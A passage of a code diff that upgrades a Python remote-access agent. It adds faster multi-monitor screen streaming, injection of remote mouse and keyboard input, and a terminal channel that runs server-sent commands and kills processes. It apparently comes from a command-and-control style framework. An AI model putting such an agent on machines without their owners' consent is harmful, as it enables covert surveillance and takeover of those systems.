@@ -2719,9 +2719,34 @@ if platform.system() == 'Windows':
 
 
 # ======================
-# Remote Desktop Handler (FIXED VERSION)
+# Remote Desktop Handler (HIGH-PERFORMANCE VERSION)
 # ======================
 class RemoteDesktopHandler:
+    KEY_MAP = {{
+        'Enter': 'enter',
+        'Backspace': 'backspace',
+        'Tab': 'tab',
+        'Escape': 'esc',
+        ' ': 'space',
+        'ArrowUp': 'up',
+        'ArrowDown': 'down',
+        'ArrowLeft': 'left',
+        'ArrowRight': 'right',
+        'Delete': 'delete',
+        'Home': 'home',
+        'End': 'end',
+        'PageUp': 'pageup',
+        'PageDown': 'pagedown',
+        'Insert': 'insert',
+        'CapsLock': 'capslock',
+        'Meta': 'win',
+        'OS': 'win',
+        'ContextMenu': 'apps',
+        'F1': 'f1', 'F2': 'f2', 'F3': 'f3', 'F4': 'f4',
+        'F5': 'f5', 'F6': 'f6', 'F7': 'f7', 'F8': 'f8',
+        'F9': 'f9', 'F10': 'f10', 'F11': 'f11', 'F12': 'f12',
+    }}
+
     def __init__(self, agent_id, crypto, server_url, config):
         self.agent_id = agent_id
         self.crypto = crypto
@@ -2732,29 +2757,121 @@ class RemoteDesktopHandler:
         self.screenshot_thread = None
         self.screenshot_running = False
         self.quality = 'medium'
-        self.screenshot_interval = 0.5  # Faster updates: 2 FPS instead of 1 FPS
+        self.fps = 5
+        self.screenshot_interval = 0.2
+        self.monitor_index = 1
+        self.monitor_bounds = {{'left': 0, 'top': 0, 'width': 1920, 'height': 1080}}
         self.last_screenshot_hash = None
         self.skip_identical_frames = True
+        self._input_lock = threading.Lock()
+        try:
+            pyautogui.PAUSE = 0
+            pyautogui.MINIMUM_DURATION = 0
+            pyautogui.MINIMUM_SLEEP = 0
+        except Exception:
+            pass
         self._setup_logger()
 
     def _setup_logger(self):
         self.logger = logging.getLogger('remote_desktop')
         self.logger.setLevel(logging.DEBUG)
-        handler = logging.StreamHandler()
-        handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
-        self.logger.addHandler(handler)
+        if not self.logger.handlers:
+            handler = logging.StreamHandler()
+            handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
+            self.logger.addHandler(handler)
 
-    def connect(self):
+    def _get_monitors_info(self):
+        monitors_list = []
+        try:
+            import mss
+            with mss.mss() as sct:
+                for idx, m in enumerate(sct.monitors):
+                    label = "All Monitors" if idx == 0 else f"Display {{idx}} ({{m['width']}}x{{m['height']}})"
+                    monitors_list.append({{
+                        'index': idx,
+                        'label': label,
+                        'width': m['width'],
+                        'height': m['height'],
+                        'left': m['left'],
+                        'top': m['top']
+                    }})
+                sel_idx = self.monitor_index if 0 <= self.monitor_index < len(sct.monitors) else (1 if len(sct.monitors) > 1 else 0)
+                self.monitor_index = sel_idx
+                sel = sct.monitors[sel_idx]
+                self.monitor_bounds = {{
+                    'left': sel['left'],
+                    'top': sel['top'],
+                    'width': sel['width'],
+                    'height': sel['height']
+                }}
+                return self.monitor_bounds['width'], self.monitor_bounds['height'], monitors_list
+        except Exception:
+            try:
+                w, h = pyautogui.size()
+            except Exception:
+                w, h = 1920, 1080
+            self.monitor_bounds = {{'left': 0, 'top': 0, 'width': w, 'height': h}}
+            monitors_list = [{{'index': 1, 'label': f"Display 1 ({{w}}x{{h}})", 'width': w, 'height': h, 'left': 0, 'top': 0}}]
+            return w, h, monitors_list
+
+    def _emit_screen_info(self):
+        try:
+            screen_width, screen_height, monitors_list = self._get_monitors_info()
+            if self.socket and self.socket.connected:
+                self.socket.emit('screen_info', {{
+                    'agent_id': self.agent_id,
+                    'width': screen_width,
+                    'height': screen_height,
+                    'scale_x': SCALE_X,
+                    'scale_y': SCALE_Y,
+                    'monitor_index': self.monitor_index,
+                    'monitors': monitors_list,
+                    'quality': self.quality,
+                    'fps': self.fps
+                }}, namespace='/remote_desktop')
+                self.socket.emit('scale_factors', {{
+                    'agent_id': self.agent_id,
+                    'scale_x': SCALE_X,
+                    'scale_y': SCALE_Y
+                }}, namespace='/remote_desktop')
+        except Exception as screen_error:
+            self.logger.error(f"Failed to send screen info: {{str(screen_error)}}")
+
+    def _map_coords(self, x, y):
+        b = self.monitor_bounds
+        w = max(1, b.get('width', 1920))
+        h = max(1, b.get('height', 1080))
+        clamped_x = int(max(0, min(float(x), w - 1))) + int(b.get('left', 0))
+        clamped_y = int(max(0, min(float(y), h - 1))) + int(b.get('top', 0))
+        return clamped_x, clamped_y
+
+    def connect(self, quality=None, fps=None):
+        if quality in ('low', 'medium', 'high', 'ultra'):
+            self.quality = quality
+        if fps and isinstance(fps, (int, float)) and 1 <= fps <= 30:
+            self.fps = int(fps)
+            self.screenshot_interval = max(0.05, 1.0 / self.fps)
+
+        if self.connected and self.socket and self.socket.connected:
+            self.logger.info("Remote Desktop already connected — refreshing keyframe & screen_info")
+            self.last_screenshot_hash = None
+            self._emit_screen_info()
+            self.start_screenshot_stream()
+            return True
+
+        self.disconnect()
+
         try:
             self.logger.info(f"Connecting to Remote Desktop WebSocket at {{self.server_url}}")
             self.socket = socketio.Client(
                 ssl_verify=False,
                 reconnection=True,
-                reconnection_attempts=5,  # Limited reconnection attempts
-                reconnection_delay=2000,
-                logger=False,  # Disable verbose logging
+                reconnection_attempts=10,
+                reconnection_delay=1500,
+                logger=False,
                 engineio_logger=False
             )
+            connected_event = threading.Event()
 
             @self.socket.on('connect', namespace='/remote_desktop')
             def on_connect():
@@ -2769,29 +2886,10 @@ class RemoteDesktopHandler:
                     }}
                     self.socket.emit('agent_connect', auth_data, namespace='/remote_desktop')
                     self.connected = True
-                    
-                    # Send screen information immediately after connection (FIXED)
-                    try:
-                        screen_width, screen_height = pyautogui.size()
-                        self.socket.emit('screen_info', {{
-                            'agent_id': self.agent_id,
-                            'width': screen_width,
-                            'height': screen_height,
-                            'scale_x': SCALE_X,
-                            'scale_y': SCALE_Y
-                        }}, namespace='/remote_desktop')
-                        
-                        self.socket.emit('scale_factors', {{
-                            'agent_id': self.agent_id,
-                            'scale_x': SCALE_X,
-                            'scale_y': SCALE_Y
-                        }}, namespace='/remote_desktop')
-                        self.logger.info("Screen info sent to remote desktop")
-                    except Exception as screen_error:
-                        self.logger.error(f"Failed to send screen info: {{str(screen_error)}}")
-                    
+                    self.last_screenshot_hash = None
+                    self._emit_screen_info()
                     self.start_screenshot_stream()
-                    self.logger.info("Remote Desktop authentication sent and streaming started")
+                    connected_event.set()
                 except Exception as auth_error:
                     self.logger.error(f"Failed to authenticate: {{str(auth_error)}}")
                     self.disconnect()
@@ -2810,10 +2908,35 @@ class RemoteDesktopHandler:
 
             @self.socket.on('change_quality', namespace='/remote_desktop')
             def on_change_quality(data):
-                self.quality = data.get('quality', 'medium')
-                # Reset screenshot hash when quality changes to force update
+                q = data.get('quality', 'medium')
+                if q in ('low', 'medium', 'high', 'ultra'):
+                    self.quality = q
                 self.last_screenshot_hash = None
-                self.logger.info(f"Quality changed to: {{self.quality}}")
+
+            @self.socket.on('change_fps', namespace='/remote_desktop')
+            def on_change_fps(data):
+                try:
+                    new_fps = int(data.get('fps', 5))
+                    if 1 <= new_fps <= 30:
+                        self.fps = new_fps
+                        self.screenshot_interval = max(0.05, 1.0 / self.fps)
+                        self.last_screenshot_hash = None
+                except Exception:
+                    pass
+
+            @self.socket.on('change_monitor', namespace='/remote_desktop')
+            def on_change_monitor(data):
+                try:
+                    self.monitor_index = int(data.get('monitor_index', 1))
+                    self.last_screenshot_hash = None
+                    self._emit_screen_info()
+                except Exception:
+                    pass
+
+            @self.socket.on('request_keyframe', namespace='/remote_desktop')
+            def on_request_keyframe(data=None):
+                self.last_screenshot_hash = None
+                self._emit_screen_info()
 
             @self.socket.on('stop_screenshots', namespace='/remote_desktop')
             def on_stop_screenshots(data):
@@ -2823,85 +2946,86 @@ class RemoteDesktopHandler:
 
             @self.socket.on('ping', namespace='/remote_desktop')
             def on_ping(data):
-                # Respond to ping to keep connection alive
                 try:
                     self.socket.emit('pong', {{'timestamp': int(time.time())}}, namespace='/remote_desktop')
-                except:
+                except Exception:
                     pass
 
             @self.socket.on('mouse_move', namespace='/remote_desktop')
             def on_mouse_move(data):
                 try:
-                    x = data.get('x')
-                    y = data.get('y')
+                    x, y = data.get('x'), data.get('y')
                     if x is not None and y is not None:
-                        # Frontend sends coordinates in screenshot resolution
-                        # These coordinates should match pyautogui.size() exactly
-                        x_screen = float(x)
-                        y_screen = float(y)
-                        
-                        # Get actual screen size
-                        screen_width, screen_height = pyautogui.size()
-                        
-                        # Clamp coordinates to screen bounds
-                        x_screen = int(max(0, min(x_screen, screen_width - 1)))
-                        y_screen = int(max(0, min(y_screen, screen_height - 1)))
-                        
-                        # Move mouse directly - no scaling needed
-                        pyautogui.moveTo(x_screen, y_screen)
-                        self.logger.debug(f"Mouse moved to ({{x_screen}}, {{y_screen}}) [screen: {{screen_width}}x{{screen_height}}]")
+                        sx, sy = self._map_coords(x, y)
+                        with self._input_lock:
+                            pyautogui.moveTo(sx, sy, _pause=False)
                 except Exception as e:
                     self.logger.error(f"Mouse move failed: {{str(e)}}")
 
             @self.socket.on('mouse_click', namespace='/remote_desktop')
             def on_mouse_click(data):
                 try:
-                    x = data.get('x')
-                    y = data.get('y')
+                    x, y = data.get('x'), data.get('y')
                     button = data.get('button', 'left')
+                    clicks = int(data.get('clicks', 1))
                     if x is not None and y is not None:
-                        # Frontend sends coordinates in screenshot resolution
-                        x_screen = float(x)
-                        y_screen = float(y)
-                        
-                        # Get actual screen size
-                        screen_width, screen_height = pyautogui.size()
-                        
-                        # Clamp coordinates to screen bounds
-                        x_screen = int(max(0, min(x_screen, screen_width - 1)))
-                        y_screen = int(max(0, min(y_screen, screen_height - 1)))
-                        
-                        # Click directly - no scaling needed
-                        pyautogui.click(x_screen, y_screen, button=button)
-                        self.logger.debug(f"Mouse clicked at ({{x_screen}}, {{y_screen}}) with {{button}} button [screen: {{screen_width}}x{{screen_height}}]")
+                        sx, sy = self._map_coords(x, y)
+                        with self._input_lock:
+                            pyautogui.click(sx, sy, clicks=clicks, button=button, _pause=False)
+                        self.last_screenshot_hash = None
                 except Exception as e:
                     self.logger.error(f"Mouse click failed: {{str(e)}}")
+
+            @self.socket.on('mouse_dblclick', namespace='/remote_desktop')
+            def on_mouse_dblclick(data):
+                try:
+                    x, y = data.get('x'), data.get('y')
+                    button = data.get('button', 'left')
+                    if x is not None and y is not None:
+                        sx, sy = self._map_coords(x, y)
+                        with self._input_lock:
+                            pyautogui.doubleClick(sx, sy, button=button, _pause=False)
+                        self.last_screenshot_hash = None
+                except Exception as e:
+                    self.logger.error(f"Mouse dblclick failed: {{str(e)}}")
+
+            @self.socket.on('mouse_down', namespace='/remote_desktop')
+            def on_mouse_down(data):
+                try:
+                    x, y = data.get('x'), data.get('y')
+                    button = data.get('button', 'left')
+                    if x is not None and y is not None:
+                        sx, sy = self._map_coords(x, y)
+                        with self._input_lock:
+                            pyautogui.mouseDown(sx, sy, button=button, _pause=False)
+                except Exception as e:
+                    self.logger.error(f"Mouse down failed: {{str(e)}}")
+
+            @self.socket.on('mouse_up', namespace='/remote_desktop')
+            def on_mouse_up(data):
+                try:
+                    x, y = data.get('x'), data.get('y')
+                    button = data.get('button', 'left')
+                    if x is not None and y is not None:
+                        sx, sy = self._map_coords(x, y)
+                        with self._input_lock:
+                            pyautogui.mouseUp(sx, sy, button=button, _pause=False)
+                        self.last_screenshot_hash = None
+                except Exception as e:
+                    self.logger.error(f"Mouse up failed: {{str(e)}}")
 
             @self.socket.on('mouse_scroll', namespace='/remote_desktop')
             def on_mouse_scroll(data):
                 try:
-                    x = data.get('x')
-                    y = data.get('y')
+                    x, y = data.get('x'), data.get('y')
                     direction = data.get('direction', 'down')
+                    amount = int(data.get('amount', 3))
                     if x is not None and y is not None:
-                        # Frontend sends coordinates in screenshot resolution
-                        x_screen = float(x)
-                        y_screen = float(y)
-                        
-                        # Get actual screen size
-                        screen_width, screen_height = pyautogui.size()
-                        
-                        # Clamp coordinates to screen bounds
-                        x_screen = int(max(0, min(x_screen, screen_width - 1)))
-                        y_screen = int(max(0, min(y_screen, screen_height - 1)))
-                        
-                        # Move mouse to position first
-                        pyautogui.moveTo(x_screen, y_screen)
-                        
-                        # Scroll: positive for up, negative for down
-                        clicks = 3 if direction == 'down' else -3
-                        pyautogui.scroll(clicks, x_screen, y_screen)
-                        self.logger.debug(f"Mouse scrolled {{direction}} at ({{x_screen}}, {{y_screen}}) [screen: {{screen_width}}x{{screen_height}}]")
+                        sx, sy = self._map_coords(x, y)
+                        clicks = -abs(amount) if direction == 'down' else abs(amount)
+                        with self._input_lock:
+                            pyautogui.scroll(clicks, x=sx, y=sy, _pause=False)
+                        self.last_screenshot_hash = None
                 except Exception as e:
                     self.logger.error(f"Mouse scroll failed: {{str(e)}}")
 
@@ -2909,42 +3033,32 @@ class RemoteDesktopHandler:
             def on_keyboard_press(data):
                 try:
                     key = data.get('key')
-                    if key:
-                        # Handle special keys
-                        if key == 'Enter':
-                            pyautogui.press('enter')
-                        elif key == 'Backspace':
-                            pyautogui.press('backspace')
-                        elif key == 'Tab':
-                            pyautogui.press('tab')
-                        elif key == 'Escape':
-                            pyautogui.press('esc')
-                        elif key == ' ':
-                            pyautogui.press('space')
-                        elif key == 'ArrowUp':
-                            pyautogui.press('up')
-                        elif key == 'ArrowDown':
-                            pyautogui.press('down')
-                        elif key == 'ArrowLeft':
-                            pyautogui.press('left')
-                        elif key == 'ArrowRight':
-                            pyautogui.press('right')
-                        elif key == 'Shift':
-                            pyautogui.keyDown('shift')
-                        elif key == 'Control':
-                            pyautogui.keyDown('ctrl')
-                        elif key == 'Alt':
-                            pyautogui.keyDown('alt')
+                    if not key:
+                        return
+                    if key in ('Shift', 'Control', 'Alt'):
+                        mod_map = {{'Shift': 'shift', 'Control': 'ctrl', 'Alt': 'alt'}}
+                        with self._input_lock:
+                            pyautogui.keyDown(mod_map[key], _pause=False)
+                        return
+
+                    ctrl = bool(data.get('ctrlKey'))
+                    alt = bool(data.get('altKey'))
+                    shift = bool(data.get('shiftKey'))
+                    mapped = self.KEY_MAP.get(key) or (key.lower() if len(key) == 1 else key.lower())
+
+                    with self._input_lock:
+                        if ctrl or alt:
+                            combo = []
+                            if ctrl: combo.append('ctrl')
+                            if alt: combo.append('alt')
+                            if shift and len(key) > 1: combo.append('shift')
+                            combo.append(mapped)
+                            pyautogui.hotkey(*combo, _pause=False)
                         elif len(key) == 1:
-                            # Regular character
-                            pyautogui.press(key)
+                            pyautogui.write(key, interval=0, _pause=False)
                         else:
-                            # Try to handle as special key
-                            try:
-                                pyautogui.press(key.lower())
-                            except:
-                                self.logger.warning(f"Unknown key: {{key}}")
-                        self.logger.debug(f"Key pressed: {{key}}")
+                            pyautogui.press(mapped, _pause=False)
+                    self.last_screenshot_hash = None
                 except Exception as e:
                     self.logger.error(f"Keyboard press failed: {{str(e)}}")
 
@@ -2952,30 +3066,42 @@ class RemoteDesktopHandler:
             def on_keyboard_release(data):
                 try:
                     key = data.get('key')
-                    if key:
-                        # Handle key releases for modifiers
-                        if key == 'Shift':
-                            pyautogui.keyUp('shift')
-                        elif key == 'Control':
-                            pyautogui.keyUp('ctrl')
-                        elif key == 'Alt':
-                            pyautogui.keyUp('alt')
-                        # For other keys, release is handled automatically
-                        self.logger.debug(f"Key released: {{key}}")
+                    if key in ('Shift', 'Control', 'Alt'):
+                        mod_map = {{'Shift': 'shift', 'Control': 'ctrl', 'Alt': 'alt'}}
+                        with self._input_lock:
+                            pyautogui.keyUp(mod_map[key], _pause=False)
                 except Exception as e:
                     self.logger.error(f"Keyboard release failed: {{str(e)}}")
 
-            # Parse server_url to separate base URL and socket.io path
+            @self.socket.on('keyboard_type', namespace='/remote_desktop')
+            def on_keyboard_type(data):
+                try:
+                    text = data.get('text', '')
+                    press_enter = bool(data.get('enter', False))
+                    if text:
+                        with self._input_lock:
+                            pyautogui.write(text, interval=0.01, _pause=False)
+                            if press_enter:
+                                pyautogui.press('enter', _pause=False)
+                        self.last_screenshot_hash = None
+                except Exception as e:
+                    self.logger.error(f"Keyboard type failed: {{str(e)}}")
+
+            @self.socket.on('keyboard_hotkey', namespace='/remote_desktop')
+            def on_keyboard_hotkey(data):
+                try:
+                    keys = data.get('keys', [])
+                    if isinstance(keys, list) and keys:
+                        with self._input_lock:
+                            pyautogui.hotkey(*[str(k).lower() for k in keys], _pause=False)
+                        self.last_screenshot_hash = None
+                except Exception as e:
+                    self.logger.error(f"Keyboard hotkey failed: {{str(e)}}")
+
             from urllib.parse import urlparse
             parsed_url = urlparse(self.server_url)
-            if parsed_url.path and parsed_url.path != '/':
-                # If there's a path, include it in base_url and use default socketio_path
-                base_url = f"{{parsed_url.scheme}}://{{parsed_url.netloc}}{{parsed_url.path}}"
-                socketio_path = '/socket.io'
-            else:
-                # No path, use default
-                base_url = f"{{parsed_url.scheme}}://{{parsed_url.netloc}}"
-                socketio_path = '/socket.io'
+            base_url = f"{{parsed_url.scheme}}://{{parsed_url.netloc}}"
+            socketio_path = f"{{parsed_url.path}}/socket.io" if parsed_url.path and parsed_url.path != '/' else '/socket.io'
 
             self.logger.info(f"Connecting to base_url: {{base_url}}, socketio_path: {{socketio_path}}")
 
@@ -2987,18 +3113,17 @@ class RemoteDesktopHandler:
                     'X-Agent-ID': self.agent_id
                 }},
                 namespaces=['/remote_desktop'],
-                transports=['websocket', 'polling']  # Allow fallback to polling
+                wait_timeout=10
             )
-
+            connected_event.wait(5)
             return True
         except Exception as e:
             self.logger.error(f"Remote Desktop connection failed: {{str(e)}}")
             return False
 
     def start_screenshot_stream(self):
-        if self.screenshot_running:
+        if self.screenshot_running and self.screenshot_thread and self.screenshot_thread.is_alive():
             return
-
         self.screenshot_running = True
         self.screenshot_thread = threading.Thread(target=self._screenshot_loop, daemon=True)
         self.screenshot_thread.start()
@@ -3008,133 +3133,137 @@ class RemoteDesktopHandler:
         if not self.screenshot_running:
             return
         self.screenshot_running = False
-        if self.screenshot_thread and self.screenshot_thread.is_alive():
-            self.screenshot_thread.join(timeout=2)  # Increased timeout
-            if self.screenshot_thread and self.screenshot_thread.is_alive():
-                self.logger.warning("Screenshot thread did not stop gracefully")
-            self.screenshot_thread = None
+        if self.screenshot_thread and self.screenshot_thread.is_alive() and threading.current_thread() != self.screenshot_thread:
+            self.screenshot_thread.join(timeout=1.5)
+        self.screenshot_thread = None
         self.logger.info("Screenshot stream stopped")
+
+    def _encode_pil_image(self, img):
+        resample_filter = getattr(Image, 'BILINEAR', Image.NEAREST)
+        if self.quality == 'low':
+            new_w = max(1, int(img.width * 0.5))
+            new_h = max(1, int(img.height * 0.5))
+            img = img.resize((new_w, new_h), resample_filter)
+            q = 55
+        elif self.quality == 'high':
+            q = 82
+        elif self.quality == 'ultra':
+            q = 92
+        else:  # medium
+            new_w = max(1, int(img.width * 0.75))
+            new_h = max(1, int(img.height * 0.75))
+            img = img.resize((new_w, new_h), resample_filter)
+            q = 70
+
+        buffered = io.BytesIO()
+        img.save(buffered, format="JPEG", quality=q)
+        return base64.b64encode(buffered.getvalue()).decode('utf-8')
 
     def _screenshot_loop(self):
         consecutive_errors = 0
-        max_consecutive_errors = 5
-        
-        while self.screenshot_running and self.connected:
-            try:
-                screenshot_data = self._take_screenshot()
-                if screenshot_data and self.socket and self.connected:
-                    # Skip identical frames if enabled
-                    if self.skip_identical_frames:
-                        current_hash = hash(screenshot_data)
-                        if current_hash == self.last_screenshot_hash:
-                            time.sleep(self.screenshot_interval)
-                            continue
-                        self.last_screenshot_hash = current_hash
+        max_consecutive_errors = 8
+        sct = None
+        try:
+            import mss
+            sct = mss.mss()
+        except Exception:
+            sct = None
 
-                    # Check if socket is still connected before emitting
-                    if self.socket and self.socket.connected:
-                        try:
+        try:
+            while self.screenshot_running and self.connected:
+                t_start = time.time()
+                try:
+                    screenshot_data = self._take_screenshot(sct=sct)
+                    if screenshot_data and self.socket and self.connected:
+                        if self.skip_identical_frames:
+                            # Fast sample hash to avoid hashing huge strings on every frame
+                            step = max(1, len(screenshot_data) // 4096)
+                            current_hash = hash(screenshot_data[::step])
+                            if current_hash == self.last_screenshot_hash:
+                                elapsed = time.time() - t_start
+                                time.sleep(max(0.02, self.screenshot_interval - elapsed))
+                                continue
+                            self.last_screenshot_hash = current_hash
+
+                        if self.socket and self.socket.connected:
                             self.socket.emit('screenshot_update', {{
                                 'agent_id': self.agent_id,
-                                'screenshot': screenshot_data
+                                'screenshot': screenshot_data,
+                                'format': 'jpeg'
                             }}, namespace='/remote_desktop')
-                            consecutive_errors = 0  # Reset error counter on success
-                        except Exception as emit_error:
-                            consecutive_errors += 1
-                            self.logger.warning(f"Screenshot emit failed ({{consecutive_errors}}/5): {{str(emit_error)}}")
-                            if consecutive_errors >= max_consecutive_errors:
-                                self.logger.error("Too many consecutive errors, stopping screenshot loop")
-                                break
-                    else:
-                        self.logger.warning("Socket not connected, stopping screenshot loop")
+                            consecutive_errors = 0
+                        else:
+                            break
+                except Exception as e:
+                    consecutive_errors += 1
+                    self.logger.error(f"Screenshot loop error ({{consecutive_errors}}/{{max_consecutive_errors}}): {{str(e)}}")
+                    if consecutive_errors >= max_consecutive_errors:
                         break
-                time.sleep(self.screenshot_interval)
-            except Exception as e:
-                consecutive_errors += 1
-                self.logger.error(f"Screenshot loop error ({{consecutive_errors}}/5): {{str(e)}}")
-                if consecutive_errors >= max_consecutive_errors:
-                    self.logger.error("Too many consecutive errors, stopping screenshot loop")
-                    break
-                time.sleep(self.screenshot_interval)
 
-    def _take_screenshot(self):
-        """Take screenshot using optimized MSS for better performance"""
+                elapsed = time.time() - t_start
+                time.sleep(max(0.02, self.screenshot_interval - elapsed))
+        finally:
+            if sct is not None:
+                try:
+                    sct.close()
+                except Exception:
+                    pass
+
+    def _take_screenshot(self, sct=None):
+        """Take screenshot using persistent MSS instance and fast bilinear JPEG encoding"""
         try:
-            # Use MSS directly for better performance
+            if sct is not None:
+                monitors = sct.monitors
+                idx = self.monitor_index if 0 <= self.monitor_index < len(monitors) else (1 if len(monitors) > 1 else 0)
+                mon = monitors[idx]
+                self.monitor_bounds = {{
+                    'left': mon['left'],
+                    'top': mon['top'],
+                    'width': mon['width'],
+                    'height': mon['height']
+                }}
+                raw = sct.grab(mon)
+                img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
+                return self._encode_pil_image(img)
+
             import mss
-            import mss.tools
-
-            with mss.mss() as sct:
-                monitor = sct.monitors[0]  # Primary monitor
-                screenshot = sct.grab(monitor)
-
-                # Apply quality settings to raw pixels for better performance
-                if self.quality == 'low':
-                    # Convert to PIL Image and resize to 50%
-                    img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
-                    new_width = int(img.width * 0.5)
-                    new_height = int(img.height * 0.5)
-                    img = img.resize((new_width, new_height), Image.LANCZOS)
-                    buffered = io.BytesIO()
-                    img.save(buffered, format="JPEG", quality=60, optimize=True)
-                    buffered.seek(0)
-                    return base64.b64encode(buffered.read()).decode('utf-8')
-                elif self.quality == 'high':
-                    # Convert directly to PNG for high quality (better compression than JPEG for screenshots)
-                    png_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
-                    return base64.b64encode(png_bytes).decode('utf-8')
-                else:  # medium
-                    # Convert to PIL Image and resize to 75%
-                    img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
-                    new_width = int(img.width * 0.75)
-                    new_height = int(img.height * 0.75)
-                    img = img.resize((new_width, new_height), Image.LANCZOS)
-                    buffered = io.BytesIO()
-                    img.save(buffered, format="JPEG", quality=70, optimize=True)
-                    buffered.seek(0)
-                    return base64.b64encode(buffered.read()).decode('utf-8')
-
-        except ImportError:
-            # Fallback to pyautogui if MSS not available
-            self.logger.warning("MSS not available, falling back to pyautogui")
+            with mss.mss() as temp_sct:
+                monitors = temp_sct.monitors
+                idx = self.monitor_index if 0 <= self.monitor_index < len(monitors) else (1 if len(monitors) > 1 else 0)
+                mon = monitors[idx]
+                self.monitor_bounds = {{
+                    'left': mon['left'],
+                    'top': mon['top'],
+                    'width': mon['width'],
+                    'height': mon['height']
+                }}
+                raw = temp_sct.grab(mon)
+                img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
+                return self._encode_pil_image(img)
+        except Exception:
             try:
                 screenshot = pyautogui.screenshot()
-
-                # Apply quality settings
-                if self.quality == 'low':
-                    new_width = int(screenshot.width * 0.5)
-                    new_height = int(screenshot.height * 0.5)
-                    screenshot = screenshot.resize((new_width, new_height), Image.LANCZOS)
-                    buffered = io.BytesIO()
-                    screenshot.save(buffered, format="JPEG", quality=60, optimize=True)
-                elif self.quality == 'high':
-                    buffered = io.BytesIO()
-                    screenshot.save(buffered, format="PNG", optimize=True)
-                else:  # medium
-                    new_width = int(screenshot.width * 0.75)
-                    new_height = int(screenshot.height * 0.75)
-                    screenshot = screenshot.resize((new_width, new_height), Image.LANCZOS)
-                    buffered = io.BytesIO()
-                    screenshot.save(buffered, format="JPEG", quality=70, optimize=True)
-
-                buffered.seek(0)
-                return base64.b64encode(buffered.read()).decode('utf-8')
-
+                if screenshot.mode != 'RGB':
+                    screenshot = screenshot.convert('RGB')
+                self.monitor_bounds = {{
+                    'left': 0,
+                    'top': 0,
+                    'width': screenshot.width,
+                    'height': screenshot.height
+                }}
+                return self._encode_pil_image(screenshot)
             except Exception as e:
-                self.logger.error(f"PyAutoGUI screenshot failed: {{str(e)}}")
+                self.logger.error(f"Fallback screenshot failed: {{str(e)}}")
                 return None
-        except Exception as e:
-            self.logger.error(f"Unexpected error during screenshot capture: {{str(e)}}")
-            return None
 
     def disconnect(self):
         self.stop_screenshot_stream()
         if self.socket:
             try:
                 self.socket.disconnect()
-                self.socket = None
             except Exception as e:
                 self.logger.error(f"Disconnect error: {{str(e)}}")
+            self.socket = None
         self.connected = False
 
 # ======================
@@ -3163,29 +3292,37 @@ class WebSocketClient:
         handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
         self.logger.addHandler(handler)
 
+    @staticmethod
+    def _decode_bytes(raw_bytes):
+        if not raw_bytes:
+            return ''
+        if isinstance(raw_bytes, str):
+            return raw_bytes
+        for enc in ('utf-8', 'cp850', 'cp1252', 'latin-1'):
+            try:
+                return raw_bytes.decode(enc)
+            except Exception:
+                continue
+        return raw_bytes.decode('utf-8', errors='replace')
+
     def _setup_event_handlers(self):
         """Setup all WebSocket event handlers"""
         if self.namespace == '/terminal':
             @self.socket.on('execute_command', namespace='/terminal')
             def on_command(data):
                 try:
-                    self.logger.info(f"Executing command: {{data.get('command')}}")
-                    
-                    # Execute the command and get results
-                    result = self._execute_command(data.get('command', ''))
-                    
-                    # Format the response properly
-                    response = {{
-                        'agent_id': self.agent_id,
-                        'command': data.get('command', ''),
-                        'output': result.get('output', ''),
-                        'error': result.get('error', ''),
-                        'current_dir': result.get('current_dir', '')
-                    }}
-                    
-                    self.logger.debug(f"Sending command result: {{response}}")
-                    self.socket.emit('command_result', response, namespace='/terminal')
-
+                    cmd_str = data.get('command', '')
+                    self.logger.info(f"Executing command: {{cmd_str}}")
+                    result = self._execute_command(cmd_str)
+                    if result is not None:
+                        response = {{
+                            'agent_id': self.agent_id,
+                            'output': result.get('output', ''),
+                            'error': result.get('error', ''),
+                            'current_dir': result.get('current_dir', self.current_dir),
+                            'returncode': result.get('returncode', 0)
+                        }}
+                        self.socket.emit('command_result', response, namespace='/terminal')
                 except Exception as e:
                     self.logger.error(f"Command handling failed: {{str(e)}}")
                     self.socket.emit('command_result', {{
@@ -3195,10 +3332,9 @@ class WebSocketClient:
                     }}, namespace='/terminal')
 
             @self.socket.on('get_current_dir', namespace='/terminal')
-            def on_get_current_dir(data):
+            def on_get_current_dir(data=None):
                 self.socket.emit('command_result', {{
                     'agent_id': self.agent_id,
-                    'command': '',
                     'output': '',
                     'error': '',
                     'current_dir': self.current_dir
@@ -3208,30 +3344,32 @@ class WebSocketClient:
             def on_kill_process(data):
                 """Kill a running process by ID"""
                 process_id = data.get('process_id')
-                
-                # Handle killing all processes
+
                 if process_id == 'ALL':
                     self._log_info("[SocketIO] Killing all running processes")
                     _kill_all_processes()
                     self.running_processes.clear()
                     self.socket.emit('command_result', {{
                         'agent_id': self.agent_id,
-                        'output': '',
-                        'error': 'All processes killed',
-                        'current_dir': self.current_dir
+                        'output': '[+] All background processes terminated.',
+                        'error': '',
+                        'current_dir': self.current_dir,
+                        'cleared_all_pids': True
                     }}, namespace='/terminal')
                     return
-                
+
                 if process_id and process_id in self.running_processes:
                     try:
                         proc_info = self.running_processes[process_id]
                         proc_info['process'].kill()
                         del self.running_processes[process_id]
+                        _unregister_process(process_id)
                         self.socket.emit('command_result', {{
                             'agent_id': self.agent_id,
-                            'output': '',
-                            'error': f"Process {{process_id}} killed",
-                            'current_dir': self.current_dir
+                            'output': f"[+] Process {{process_id}} terminated.",
+                            'error': '',
+                            'current_dir': self.current_dir,
+                            'finished_pid': process_id
                         }}, namespace='/terminal')
                     except Exception as e:
                         self.logger.error(f"Failed to kill process: {{str(e)}}")
@@ -3239,22 +3377,23 @@ class WebSocketClient:
                     self.socket.emit('command_result', {{
                         'agent_id': self.agent_id,
                         'output': '',
-                        'error': f"Process {{process_id}} not found",
-                        'current_dir': self.current_dir
+                        'error': f"Process {{process_id}} not found or already finished",
+                        'current_dir': self.current_dir,
+                        'finished_pid': process_id
                     }}, namespace='/terminal')
 
             @self.socket.on('list_processes', namespace='/terminal')
             def on_list_processes(data):
                 """List all running processes"""
                 process_list = []
-                for pid, info in self.running_processes.items():
+                for pid, info in list(self.running_processes.items()):
                     process_list.append({{
